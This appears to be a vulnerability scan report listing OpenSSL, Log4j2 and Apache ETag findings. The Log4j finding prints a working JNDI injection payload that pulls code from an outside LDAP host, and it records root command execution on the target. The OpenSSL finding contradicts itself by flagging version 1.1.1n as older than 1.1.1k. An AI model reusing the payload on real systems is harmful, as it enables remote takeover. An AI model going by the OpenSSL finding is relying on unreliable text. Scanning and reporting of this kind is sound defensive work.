ReportItem.description: The remote host is running a version of OpenSSL prior to 1.1.1k. It is, therefore, affected by multiple vulnerabilities.
ReportItem.synopsis: The remote service is running a vulnerable OpenSSL version.
ReportItem.solution: Upgrade to OpenSSL version 1.1.1k or later.
ReportItem.plugin_output: Remote banner: OpenSSL/1.1.1n-0+deb11u5 (Debian) Installed version: 1.1.1n Fixed version: 1.1.1k Note: Debian-11+deb11u5 security patch installed on target.

ReportItem.description: Apache Log4j2 versions 2.0-beta9 through 2.14.1 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints.
ReportItem.synopsis: An attacker who can control log messages can execute arbitrary code.
ReportItem.solution: Update to Apache Log4j 2.15.0 or later.
ReportItem.plugin_output: Exploitation successful! Sent payload: ${jndi:ldap://192.168.10.1:1389/Exploit} Received callback from target container. Executed command 'id': uid=0(root) gid=0(root) groups=0(root)

ReportItem.description: The remote web server reveals inode numbers in the ETag header.
ReportItem.synopsis: The web server leaks internal filesystem metadata.
ReportItem.solution: Configure FileETag MTime Size in httpd.conf.
